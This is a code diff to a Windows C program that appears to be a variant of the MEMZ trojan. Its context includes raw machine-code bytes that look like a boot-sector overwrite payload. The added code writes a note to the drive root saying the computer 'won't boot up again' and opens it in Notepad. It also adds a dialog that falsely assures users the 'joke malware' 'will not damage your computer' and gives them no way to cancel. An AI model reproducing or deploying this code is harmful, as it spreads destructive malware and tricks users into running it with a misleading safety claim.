@@ -44,6 +44,7 @@ LPCWSTR lpPaths[13] = {
 };
 
 HCRYPTPROV prov;
+const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
 int scrw = GetSystemMetrics(SM_CXSCREEN);
 int scrh = GetSystemMetrics(SM_CYSCREEN);
 HWND hwnd;
@@ -58,8 +59,9 @@ const char *sounds[] = {
 	"SystemStart",
 };
 
+DWORD wb;
 const size_t nSounds = sizeof(sounds) / sizeof(void *);
-
+const size_t msg_len = sizeof(msg);
 
 const unsigned char code1[] = {
 	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
@@ -792,4 +794,18 @@ void OrientationsScreen()
     // 恢复默认方向
     //dm.dmDisplayOrientation = DMDO_DEFAULT;
     //ChangeDisplaySettings(&dm, 0);
+}
+
+void StartWarning(){
+	MessageBox(NULL,"This is a joke malware!\n\
+This will not damage your computer in any way.\n\
+Click 'OK' to run the program,Click 'Cancel' to close the program(but,where is cancel)\n\
+Have fun~","Open Tip",MB_OK|MB_ICONINFORMATION);
+}
+
+void CreateNote(){
+	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+	WriteFile(note, msg, msg_len, &wb, NULL);
+	CloseHandle(note);
+	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
 }
